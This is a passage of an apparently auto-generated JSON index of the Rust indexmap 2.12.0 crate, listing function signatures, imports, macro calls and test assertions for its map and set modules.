          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn drop(&mut self) {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::{Bucket, ExtractCore, IndexMap, IndexMapCore, Slice};",
          "use alloc::vec::{self, Vec};",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::iter::FusedIterator;",
          "use core::ops::{Index, RangeBounds};",
          "use core::slice;"
        ],
        "macros": [
          "iterator_methods!(Bucket::refs);",
          "double_ended_iterator_methods!(Bucket::refs);",
          "iterator_methods!(Bucket::ref_mut);",
          "double_ended_iterator_methods!(Bucket::ref_mut);",
          "iterator_methods!(Bucket::muts);",
          "double_ended_iterator_methods!(Bucket::muts);",
          "iterator_methods!(Bucket::key_value);",
          "double_ended_iterator_methods!(Bucket::key_value);",
          "iterator_methods!(Bucket::key_value);",
          "double_ended_iterator_methods!(Bucket::key_value);",
          "iterator_methods!(Bucket::key_ref);",
          "double_ended_iterator_methods!(Bucket::key_ref);",
          "/// assert_eq!(map[0], \"LOREM\");",
          "/// assert_eq!(map.keys()[0], \"lorem\");",
          "/// assert_eq!(map[1], \"IPSUM\");",
          "/// assert_eq!(map.keys()[1], \"ipsum\");",
          "/// assert_eq!(map.keys()[0], \"amet\");",
          "/// assert_eq!(map.keys()[1], \"sit\");",
          "/// assert_eq!(map.keys()[0], \"amet\");",
          "/// assert_eq!(map.keys()[1], \"dolor\");",
          "/// assert_eq!(keys[0], \"amet\");",
          "/// assert_eq!(keys.next().map(|s| &**s), Some(\"amet\"));",
          "/// assert_eq!(keys[0], \"dolor\");",
          "/// assert_eq!(keys[1], \"ipsum\");",
          "/// assert_eq!(slice[0], \"IPSUM\");",
          "/// assert_eq!(slice.keys()[0], \"ipsum\");",
          "/// println!(\"{:?}\", map.keys()[10]); // panics!",
          "iterator_methods!(Bucket::key);",
          "double_ended_iterator_methods!(Bucket::key);",
          "iterator_methods!(Bucket::value_ref);",
          "double_ended_iterator_methods!(Bucket::value_ref);",
          "iterator_methods!(Bucket::value_mut);",
          "double_ended_iterator_methods!(Bucket::value_mut);",
          "iterator_methods!(Bucket::value);",
          "double_ended_iterator_methods!(Bucket::value);"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/mutable.rs",
        "function_defs": [
          "fn get_full_mut2<Q>(&mut self, key: &Q) -> Option<(usize, &mut Self::Key, &mut Self::Value)>",
          "fn get_index_mut2(&mut self, index: usize) -> Option<(&mut Self::Key, &mut Self::Value)>;",
          "fn iter_mut2(&mut self) -> IterMut2<'_, Self::Key, Self::Value>;",
          "fn retain2<F>(&mut self, keep: F)",
          "fn get_full_mut2<Q>(&mut self, key: &Q) -> Option<(usize, &mut K, &mut V)>",
          "fn get_index_mut2(&mut self, index: usize) -> Option<(&mut K, &mut V)> {",
          "fn iter_mut2(&mut self) -> IterMut2<'_, Self::Key, Self::Value> {",
          "fn retain2<F>(&mut self, keep: F)",
          "fn key_mut(&mut self) -> &mut Self::Key;",
          "fn key_mut(&mut self) -> &mut Self::Key {",
          "fn key_mut(&mut self) -> &mut Self::Key {",
          "fn key_mut(&mut self) -> &mut Self::Key {",
          "fn key_mut(&mut self) -> &mut Self::Key {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::hash::{BuildHasher, Hash};",
          "use super::{"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/serde_seq.rs",
        "function_defs": [
          "fn serialize<T>(&self, serializer: T) -> Result<T::Ok, T::Error>",
          "fn serialize<Se>(&self, serializer: Se) -> Result<Se::Ok, Se::Error>",
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>"
        ],
        "struct_defs": [
          "struct SeqVisitor<K, V, S>(PhantomData<(K, V, S)>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use serde_core::de::{Deserialize, Deserializer, SeqAccess, Visitor};",
          "use serde_core::ser::{Serialize, Serializer};",
          "use core::fmt::{self, Formatter};",
          "use core::hash::{BuildHasher, Hash};",
          "use core::marker::PhantomData;",
          "use crate::map::Slice as MapSlice;",
          "use crate::serde::cautious_capacity;",
          "use crate::set::Slice as SetSlice;",
          "use crate::IndexMap;"
        ],
        "macros": [
          "write!(formatter, \"a sequenced map\")"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/tests.rs",
        "function_defs": [
          "fn it_works() {",
          "fn new() {",
          "fn insert() {",
          "fn insert_full() {",
          "fn insert_2() {",
          "fn insert_order() {",
          "fn shift_insert() {",
          "fn insert_sorted_bad() {",
          "fn grow() {",
          "fn reserve() {",
          "fn try_reserve() {",
          "fn shrink_to_fit() {",
          "fn remove() {",
          "fn remove_to_empty() {",
          "fn swap_remove_index() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn entry() {",
          "fn entry_and_modify() {",
          "fn entry_or_default() {",
          "fn default() -> Self {",
          "fn occupied_entry_key() {",
          "fn get_index_entry() {",
          "fn from_entries() {",
          "fn keys() {",
          "fn into_keys() {",
          "fn values() {",
          "fn values_mut() {",
          "fn into_values() {",
          "fn drain_range() {",
          "fn from_array() {",
          "fn iter_default() {",
          "fn assert_default<T>()",
          "fn get_index_mut2() {",
          "fn shift_shift_remove_index() {",
          "fn shift_remove_entry() {",
          "fn shift_remove_full() {",
          "fn sorted_unstable_by() {",
          "fn into_boxed_slice() {",
          "fn last_mut() {",
          "fn insert_before_oob() {",
          "fn clear() {",
          "fn get_range() {",
          "fn get_range_mut() {",
          "fn shift_insert_oob() {",
          "fn test_binary_search_by() {",
          "fn test_binary_search_by_key() {",
          "fn test_partition_point() {",
          "fn $test() {",
          "fn disjoint_mut_empty_map() {",
          "fn disjoint_mut_empty_param() {",
          "fn disjoint_mut_single_fail() {",
          "fn disjoint_mut_single_success() {",
          "fn disjoint_mut_multi_success() {",
          "fn disjoint_mut_multi_success_unsized_key() {",
          "fn disjoint_mut_multi_success_borrow_key() {",
          "fn disjoint_mut_multi_fail_missing() {",
          "fn disjoint_mut_multi_fail_duplicate_panic() {",
          "fn disjoint_indices_mut_fail_oob() {",
          "fn disjoint_indices_mut_empty() {",
          "fn disjoint_indices_mut_success() {",
          "fn disjoint_indices_mut_fail_duplicate() {",
          "fn insert_sorted_by_key() {",
          "fn insert_sorted_by() {",
          "fn is_sorted() {",
          "fn expect(map: &IndexMap<i32, i32>, e: [bool; 7]) {",
          "fn is_sorted_trivial() {",
          "fn expect(map: &IndexMap<i32, i32>, e: [bool; 5]) {"
        ],
        "struct_defs": [
          "struct K;",
          "struct V;"
        ],
        "impl_blocks": [
          "impl Default for TestEnum {"
        ],
        "uses": [
          "use super::*;",
          "use std::string::String;"
        ],
        "macros": [
          "assert_eq!(map.is_empty(), true);",
          "assert_eq!(map.len(), 1);",
          "assert!(map.get(&1).is_some());",
          "assert_eq!(map.is_empty(), false);",
          "println!(\"{:?}\", map);",
          "assert_eq!(map.capacity(), 0);",
          "assert_eq!(map.len(), 0);",
          "assert_eq!(map.is_empty(), true);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.get(&elt), Some(&elt));",
          "assert_eq!(map[&elt], elt);",
          "println!(\"{:?}\", map);",
          "assert!(map.get(&elt).is_none());",
          "assert_eq!(map.len(), i);",
          "assert_eq!(existing, None);",
          "assert_eq!(Some(index), map.get_full(&elt).map(|x| x.0));",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(existing, Some(elt));",
          "assert_eq!(Some(index), map.get_full(&elt).map(|x| x.0));",
          "assert_eq!(map.len(), len);",
          "keys.extend(if cfg!(miri) { 32..64 } else { 128..267 });",
          "println!(\"old_map: {:?}\", old_map);",
          "println!(\"map: {:?}\", map);",
          "panic!(\"did not find {} in map\", key);",
          "assert!(map.get(&i).is_some(), \"did not find {}\", i);",
          "assert_eq!(map.keys().count(), map.len());",
          "assert_eq!(map.keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map.get_index(i).unwrap().0, k);",
          "assert_eq!(map.keys().count(), map.len());",
          "assert_eq!(map.keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map.get_index(i).unwrap().0, k);",
          "assert_eq!(map.keys().count(), insert.len());",
          "assert_eq!(insert[0], map.keys()[0]);",
          "assert_eq!(a, b);",
          "assert_eq!(map.first(), Some((&10, &())));",
          "assert_eq!(map.last(), Some((&10, &())));",
          "assert!(map.keys().copied().eq(0..=10));",
          "assert_eq!(map.first(), Some((&5, &())));",
          "assert_eq!(map.last(), Some((&6, &())));",
          "assert!(map.keys().copied().eq(0..=10));",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.get(&elt), Some(&elt));",
          "assert_eq!(map[&elt], elt);",
          "println!(\"{:?}\", map);",
          "println!(\"{:?}\", map);",
          "assert!(map.get(&elt).is_none());",
          "assert_eq!(map.capacity(), 0);",
          "assert!(capacity >= 100);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.capacity(), capacity);",
          "assert_eq!(map.get(&i), Some(&(i * i)));",
          "assert_eq!(map.len(), capacity + 1);",
          "assert!(map.capacity() > capacity);",
          "assert_eq!(map.get(&capacity), Some(&std::usize::MAX));",
          "assert_eq!(map.capacity(), 0);",
          "assert_eq!(map.try_reserve(100), Ok(()));",
          "assert!(map.capacity() >= 100);",
          "assert!(map.try_reserve(usize::MAX).is_err());",
          "assert_eq!(map.capacity(), 0);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert!(map.capacity() >= i + 1);",
          "assert_eq!(map.get(&i), Some(&(i * i)));",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.capacity(), i + 1);",
          "assert_eq!(map.get(&i), Some(&(i * i)));",
          "assert_eq!(map.keys().count(), map.len());",
          "assert_eq!(map.keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert!(map.swap_remove_full(&key).is_none());",
          "println!(\"{:?}\", map);",
          "//println!(\"{:?}\", map);",
          "assert_eq!(map.swap_remove_full(&key), Some((index, key, key)));",
          "println!(\"{:?}\", map);",
          "assert_eq!(map.get(key).is_some(), !remove.contains(key));",
          "assert_eq!(map.len(), insert.len() - remove.len());",
          "assert_eq!(map.keys().count(), insert.len() - remove.len());",
          "assert!(map.is_empty());",
          "assert_eq!(out_vec, out_map);",
          "assert_eq!(vector.len(), map.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map_a, map_b);",
          "assert_ne!(map_a, map_b);",
          "assert_ne!(map_a, map_c);",
          "assert_ne!(map_c, map_a);",
          "assert_eq!(",
          "assert_eq!(e.index(), 2);",
          "assert_eq!(e, &\"3\");",
          "assert_eq!(e.index(), 1);",
          "assert_eq!(e.key(), &2);",
          "Entry::Occupied(ref e) => assert_eq!(e.get(), &\"2\"),",
          "Entry::Vacant(_) => panic!(),",
          "assert_eq!(e.or_insert(\"4\"), &\"2\");",
          "assert_eq!(Some(&\"2\"), map.get(&1));",
          "assert_eq!(None, map.get(&2));",
          "assert_eq!(&mut TestEnum::NonDefaultValue, map.entry(1).or_default());",
          "assert_eq!(&mut TestEnum::DefaultValue, map.entry(2).or_default());",
          "assert_ne!(k1_ptr, k2_ptr);",
          "assert_eq!(ptr, k1_ptr);",
          "assert_ne!(ptr, k2_ptr);",
          "Entry::Vacant(_) => panic!(),",
          "assert!(map.get_index_entry(0).is_none());",
          "assert!(map.first_entry().is_none());",
          "assert!(map.last_entry().is_none());",
          "assert!(map.get_index_entry(4).is_none());",
          "assert_eq!(*e.key(), 1);",
          "assert_eq!(*e.get(), \"1\");",
          "assert_eq!(e.swap_remove(), \"1\");",
          "assert_eq!(*e.key(), 3);",
          "assert_eq!(*e.get(), \"3\");",
          "assert_eq!(e.insert(\"4\"), \"3\");",
          "assert_eq!(*map.get(&3).unwrap(), \"4\");",
          "assert_eq!(*e.key(), 0);",
          "assert_eq!(*e.get(), \"0\");",
          "assert_eq!(*e.key(), 2);",
          "assert_eq!(*e.get(), \"2\");",
          "Entry::Vacant(_) => panic!(),",
          "assert_eq!(e.index(), 0);",
          "assert_eq!(*e.key(), 1);",
          "assert_eq!(*e.get(), \"1\");",
          "None => panic!(),",
          "assert_eq!(e.index(), 1);",
          "assert_eq!(*e.key(), 2);",
          "assert_eq!(*e.get(), \"2\");",
          "assert_eq!(keys.len(), 3);",
          "assert!(keys.contains(&1));",
          "assert!(keys.contains(&2));",
          "assert!(keys.contains(&3));",
          "assert_eq!(keys.len(), 3);",
          "assert!(keys.contains(&1));",
          "assert!(keys.contains(&2));",
          "assert!(keys.contains(&3));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&'a'));",
          "assert!(values.contains(&'b'));",
          "assert!(values.contains(&'c'));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&2));",
          "assert!(values.contains(&4));",
          "assert!(values.contains(&6));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&'a'));",
          "assert!(values.contains(&'b'));",
          "assert!(values.contains(&'c'));",
          "assert!(vec.iter().eq(map.keys()));",
          "assert_eq!(map.get_index_of(x), Some(i));",
          "assert_eq!(map, expected)",
          "assert!(T::default().next().is_none());",
          "assert_eq!(*key, 1);",
          "assert_eq!(*value, 2);",
          "assert_eq!(map[0], 7);",
          "assert_eq!(map.get_index(0).unwrap().0, &8);",
          "assert_eq!(result, Some((3, 4)));",
          "assert_eq!(map.len(), 4);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8), (9, 10)]);",
          "assert_eq!(result, Some((5, 6)));",
          "assert_eq!(map.len(), 3);",
          "assert_eq!(map.as_slice(), &[(1, 2), (7, 8), (9, 10)]);",
          "assert_eq!(result, Some((9, 10)));",
          "assert_eq!(map.len(), 2);",
          "assert_eq!(map.as_slice(), &[(1, 2), (7, 8)]);",
          "assert_eq!(result, None);",
          "assert_eq!(map.len(), 2);",
          "assert_eq!(map.as_slice(), &[(1, 2), (7, 8)]);",
          "assert_eq!(result, Some((3, 4)));",
          "assert_eq!(map.len(), 4);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8), (9, 10)]);",
          "assert_eq!(result, Some((9, 10)));",
          "assert_eq!(map.len(), 3);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8)]);",
          "assert_eq!(result, None);",
          "assert_eq!(map.len(), 3);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8)]);",
          "assert_eq!(result, Some((1, 3, 4)));",
          "assert_eq!(map.len(), 4);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8), (9, 10)]);",
          "assert_eq!(result, Some((3, 9, 10)));",
          "assert_eq!(map.len(), 3);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8)]);",
          "assert_eq!(result, None);",
          "assert_eq!(map.len(), 3);",
          "assert_eq!(map.as_slice(), &[(1, 2), (5, 6), (7, 8)]);",
          "assert_eq!(",
          "assert_eq!(boxed_slice.len(), 5);",
          "assert_eq!(",
          "assert_eq!(last_entry, None);",
          "assert_eq!(last_entry, Some((&\"key3\", &mut 3)));",
          "assert_eq!(map.get(\"key3\"), Some(&4));",
          "assert_eq!(map.len(), 0);",
          "assert!(result.unwrap().is_empty());",
          "assert!(result.is_none());",
          "assert_eq!(slice.len(), 2);",
          "assert_eq!(slice, &[(3, 30), (4, 40)]);",
          "assert!(result.unwrap().is_empty());",
          "assert!(result.is_none());",
          "assert_eq!(slice.len(), 2);",
          "assert_eq!(slice, &mut [(3, 30), (4, 40)]);",
          "assert_eq!(slice, &mut [(3, 31), (4, 41)]);",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&5)), Err(0));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&3)), Err(0));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&4)), Ok(0));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&5)), Err(1));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&5)), Err(3));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&6)), Ok(3));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&7)), Err(4));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&8)), Ok(4));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&9)), Err(6));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&6)), Ok(3));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&5)), Err(3));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&8)), Ok(5));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&7)), Err(5));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&0)), Err(0));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&0)), Err(0));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&1)), Ok(0));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&2)), Err(1));",
          "assert!(match b.binary_search_by(|_, x| x.cmp(&3)) {",
          "assert!(match b.binary_search_by(|_, x| x.cmp(&3)) {",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&4)), Err(4));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&5)), Err(4));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&6)), Err(4));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&7)), Ok(4));",
          "assert_eq!(b.binary_search_by(|_, x| x.cmp(&8)), Err(5));",
          "assert_eq!(b.binary_search_by_key(&5, |_, &x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&3, |_, &x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&4, |_, &x| x), Ok(0));",
          "assert_eq!(b.binary_search_by_key(&5, |_, &x| x), Err(1));",
          "assert_eq!(b.binary_search_by_key(&5, |_, &x| x), Err(3));",
          "assert_eq!(b.binary_search_by_key(&6, |_, &x| x), Ok(3));",
          "assert_eq!(b.binary_search_by_key(&7, |_, &x| x), Err(4));",
          "assert_eq!(b.binary_search_by_key(&8, |_, &x| x), Ok(4));",
          "assert_eq!(b.binary_search_by_key(&9, |_, &x| x), Err(6));",
          "assert_eq!(b.binary_search_by_key(&6, |_, &x| x), Ok(3));",
          "assert_eq!(b.binary_search_by_key(&5, |_, &x| x), Err(3));",
          "assert_eq!(b.binary_search_by_key(&8, |_, &x| x), Ok(5));",
          "assert_eq!(b.binary_search_by_key(&7, |_, &x| x), Err(5));",
          "assert_eq!(b.binary_search_by_key(&0, |_, &x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&0, |_, &x| x), Err(0));",
          "assert_eq!(b.binary_search_by_key(&1, |_, &x| x), Ok(0));",
          "assert_eq!(b.binary_search_by_key(&2, |_, &x| x), Err(1));",
          "assert!(match b.binary_search_by_key(&3, |_, &x| x) {",
          "assert!(match b.binary_search_by_key(&3, |_, &x| x) {",
          "assert_eq!(b.binary_search_by_key(&4, |_, &x| x), Err(4));",
          "assert_eq!(b.binary_search_by_key(&5, |_, &x| x), Err(4));",
          "assert_eq!(b.binary_search_by_key(&6, |_, &x| x), Err(4));",
          "assert_eq!(b.binary_search_by_key(&7, |_, &x| x), Ok(4));",
          "assert_eq!(b.binary_search_by_key(&8, |_, &x| x), Err(5));",
          "assert_eq!(b.partition_point(|_, &x| x < 5), 0);",
          "assert_eq!(b.partition_point(|_, &x| x < 3), 0);",
          "assert_eq!(b.partition_point(|_, &x| x < 4), 0);",
          "assert_eq!(b.partition_point(|_, &x| x < 5), 1);",
          "assert_eq!(b.partition_point(|_, &x| x < 5), 3);",
          "assert_eq!(b.partition_point(|_, &x| x < 6), 3);",
          "assert_eq!(b.partition_point(|_, &x| x < 7), 4);",
          "assert_eq!(b.partition_point(|_, &x| x < 8), 4);",
          "assert_eq!(b.partition_point(|_, &x| x < 9), 6);",
          "assert_eq!(b.partition_point(|_, &x| x < 6), 3);",
          "assert_eq!(b.partition_point(|_, &x| x < 5), 3);",
          "assert_eq!(b.partition_point(|_, &x| x < 8), 5);",
          "assert_eq!(b.partition_point(|_, &x| x < 7), 5);",
          "assert_eq!(b.partition_point(|_, &x| x < 0), 0);",
          "assert_eq!(b.partition_point(|_, &x| x < 0), 0);",
          "assert_eq!(b.partition_point(|_, &x| x < 1), 0);",
          "assert_eq!(b.partition_point(|_, &x| x < 2), 1);",
          "assert_eq!(b.partition_point(|_, &x| x < 3), 1);",
          "assert_eq!(b.partition_point(|_, &x| x < 4), 4);",
          "assert_eq!(b.partition_point(|_, &x| x < 5), 4);",
          "assert_eq!(b.partition_point(|_, &x| x < 6), 4);",
          "assert_eq!(b.partition_point(|_, &x| x < 7), 4);",
          "assert_eq!(b.partition_point(|_, &x| x < 8), 5);",
          "move_index_oob!(test_move_index_out_of_bounds_0_10, 0, 10);",
          "move_index_oob!(test_move_index_out_of_bounds_0_max, 0, usize::MAX);",
          "move_index_oob!(test_move_index_out_of_bounds_10_0, 10, 0);",
          "move_index_oob!(test_move_index_out_of_bounds_max_0, usize::MAX, 0);",
          "assert_eq!(",
          "assert_eq!(map.get_disjoint_mut([] as [&u32; 0]), []);",
          "assert_eq!(map.get_disjoint_mut([&0]), [None]);",
          "assert_eq!(map.get_disjoint_mut([&1]), [Some(&mut 10)]);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(map.get_disjoint_mut([&1, &5]), [Some(&mut 100), None]);",
          "assert_eq!(map.get_disjoint_mut([&5, &6]), [None, None]);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(map.get_disjoint_indices_mut([]), Ok([]));",
          "assert_eq!(map.get_disjoint_indices_mut([0]), Ok([(&1, &mut 10)]));",
          "assert_eq!(map.get_disjoint_indices_mut([1]), Ok([(&321, &mut 20)]));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(old, None);",
          "assert_eq!(values, *map.as_slice());",
          "assert_eq!(old, Some(*value));",
          "assert_eq!(values, *map.as_slice());",
          "assert_eq!(old, None);",
          "assert_eq!(values, *map.as_slice());",
          "assert_eq!(old, Some(*value));",
          "assert_eq!(values, *map.as_slice());",
          "assert_eq!(e[0], map.is_sorted());",
          "assert_eq!(e[1], map.is_sorted_by(|k1, _, k2, _| k1 < k2));",
          "assert_eq!(e[2], map.is_sorted_by(|k1, _, k2, _| k1 > k2));",
          "assert_eq!(e[3], map.is_sorted_by(|_, v1, _, v2| v1 < v2));",
          "assert_eq!(e[4], map.is_sorted_by(|_, v1, _, v2| v1 > v2));",
          "assert_eq!(e[5], map.is_sorted_by_key(|k, _| k));",
          "assert_eq!(e[6], map.is_sorted_by_key(|_, v| v));",
          "assert_eq!(e[0], map.is_sorted());",
          "assert_eq!(e[1], map.is_sorted_by(|_, _, _, _| true));",
          "assert_eq!(e[2], map.is_sorted_by(|_, _, _, _| false));",
          "assert_eq!(e[3], map.is_sorted_by_key(|_, _| 0f64));",
          "assert_eq!(e[4], map.is_sorted_by_key(|_, _| f64::NAN));"
        ],
        "derives": [
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 39
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/set/slice.rs",
        "function_defs": [
          "fn into_boxed(self: Box<Self>) -> Box<[Bucket<T>]> {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn default() -> Self {",
          "fn default() -> Self {",
          "fn clone(&self) -> Self {",
          "fn from(slice: &Slice<T>) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Slice<U>) -> bool {",
          "fn eq(&self, other: &[U]) -> bool {",
          "fn eq(&self, other: &Slice<U>) -> bool {",
          "fn eq(&self, other: &[U; N]) -> bool {",
          "fn eq(&self, other: &Slice<U>) -> bool {",
          "fn partial_cmp(&self, other: &Self) -> Option<Ordering> {",
          "fn cmp(&self, other: &Self) -> Ordering {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn index(&self, index: usize) -> &Self::Output {",
          "fn index(&self, range: $range) -> &Self::Output {",
          "fn index(&self, range: $range) -> &Self::Output {",
          "fn slice_index() {",
          "fn check(vec_slice: &[i32], set_slice: &Slice<i32>, sub_slice: &Slice<i32>) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::{Bucket, IndexSet, IntoIter, Iter};",
          "use crate::util::{slice_eq, try_simplify_range};",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{Hash, Hasher};",
          "use core::ops::{self, Bound, Index, RangeBounds};",
          "use super::*;"
        ],
        "macros": [
          "impl_index!(",
          "assert_eq!(set_slice as *const _, sub_slice as *const _);",
          "assert_eq!(vec[i], set[i]);",
          "assert_eq!(vec[i], slice[i]);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/set/iter.rs",
        "function_defs": [
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fold<B, F>(self, init: B, f: F) -> B",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn rfold<B, F>(self, init: B, f: F) -> B",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fold<B, F>(self, init: B, f: F) -> B",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn rfold<B, F>(self, init: B, f: F) -> B",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn len(&self) -> usize {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {"
        ],
        "struct_defs": [
          "struct UnitValue<I>(I);"
        ],
        "impl_blocks": [],
        "uses": [
          "use crate::map::{ExtractCore, IndexMapCore};",
          "use super::{Bucket, IndexSet, Slice};",
          "use alloc::vec::{self, Vec};",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::iter::{Chain, FusedIterator};",
          "use core::ops::RangeBounds;",
          "use core::slice::Iter as SliceIter;"
        ],
        "macros": [
          "iterator_methods!(Bucket::key_ref);",
          "double_ended_iterator_methods!(Bucket::key_ref);",
          "iterator_methods!(Bucket::key);",
